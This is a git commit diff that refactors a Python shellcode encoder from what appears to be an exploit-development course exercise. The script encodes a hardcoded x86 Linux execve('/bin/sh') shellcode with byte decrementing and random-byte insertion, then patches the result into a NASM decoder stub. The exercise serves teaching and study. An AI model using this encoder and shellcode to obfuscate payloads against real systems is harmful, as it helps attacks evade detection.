e8560b1b817fc298d2b85e582e56d2d3819f40ae
root <ricardojruiz93@gmail.com>
2019-03-12 16:29:09 +0100

    Ex 4 - Encoding with random insertions working (3 times in a row, 0 fails)

--- ex4/Insertion-Encoder.py
+++ ex4/Insertion-Encoder.py
@@ -15,86 +15,61 @@ def ror(x, n, bits = 8):
 def rol(x, n, bits = 8):
     return ror(x, bits - n, bits)
 
-    
 
 def get_stop_code(shellcode):
 	list_codes = bytearray(shellcode)
 	min_number = min(list_codes)
 	max_number = max(list_codes)
 	stop_code = 0
-	if min_number > 1:
-		stop_code = min_number - 1
-	elif max_number < 254:
-		stop_code = max_number + 1
-	else:
-		for i in range (1,254):
+	
+	for i in range (max_number,min_number,-1):
 			if i not in list_codes:
 				stop_code = i
 				break
 	if stop_code is 0:
-		print "It is not possible to use this encoding :("
+		print "You are using all opcodes, we can not use this encoding :/"
 		sys.exit(1)
 	return stop_code
 
 
+def encode_shellcode(shellcode, hex_stop_code):
+	encoded2 = ""
+	for x in bytearray(shellcode) :	
+		# Value 1: Encoded 'x'
+		x = x - 1
+		encoded2 += '0x'
+		encoded2 += '%02x,' %x
+		# Value 2: Random value != stop_code
+		rand_number = random.randint(1,10)
+		encoded2 += '0x%02x,' % rand_number
+	encoded2 += '0x'+hex_stop_code+',0x'+hex_stop_code
+	return encoded2
+
+def create_new_file(hex_stop_code, encoded2):
+	file_name = 'insertion-decoder.nasm'
+	lines = open(file_name).read().splitlines()
+	new_file_lines = []
+	for l in lines:
+		if l.endswith("marker1"):
+			new_l = "	xor bl, 0x"
+			new_l += hex_stop_code
+			new_l += " ; marker1"
+			new_file_lines.append(new_l)
+		elif l.endswith("marker2"):
+			new_l = "	EncodedShellcode: db "
+			new_l += encoded2
+			new_l += " ; marker2"
+			new_file_lines.append(new_l)
+		else:
+			new_file_lines.append(l)
+	open(file_name,'w').write('\n'.join(new_file_lines))
+
 
 shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
-#shellcode = (sys.argv[1])
-encoded = ""
-encoded2 = ""
 
 stop_code = get_stop_code(shellcode)
 hex_stop_code = '{:02X}'.format(stop_code).lower()
-
-
-
-for x in bytearray(shellcode) :
-	
-	#x = rol(x, 1, 8)
-	x = x - 1
-
-	number = random.randint(0,255)
-	while number == stop_code:
-	   number = random.randint(0,255)
-
-	'''
-	encoded += '\\x'
-	encoded += '%02x' % x
-	encoded += '\\x%02x' % number
-	'''
-
-	encoded2 += '0x'
-	encoded2 += '%02x,' %x
-	encoded2 += '0x%02x,' % number
-
-encoded += '\\x'+hex_stop_code+'\\x'+hex_stop_code
-encoded2 += '0x'+hex_stop_code+',0x'+hex_stop_code
-
-#print encoded
-print encoded2
-print 'Len: %d' % len(bytearray(shellcode))
-
-
-lines = open('insertion-decoder.nasm').read().splitlines()
-
-new_file_lines = []
-
-for l in lines:
-	if l.endswith("marker1"):
-		new_l = "	xor bl, 0x"
-		new_l += hex_stop_code
-		new_l += " ; marker1"
-		new_file_lines.append(new_l)
-
-	elif l.endswith("marker2"):
-		new_l = "	EncodedShellcode: db "
-		new_l += encoded2
-		new_l += " ; marker2"
-		new_file_lines.append(new_l)
-
-	else:
-		new_file_lines.append(l)
-
-open('insertion-decoder.nasm','w').write('\n'.join(new_file_lines))
+encoded2 = encode_shellcode(shellcode, hex_stop_code)
+create_new_file(hex_stop_code, encoded2)
 
 
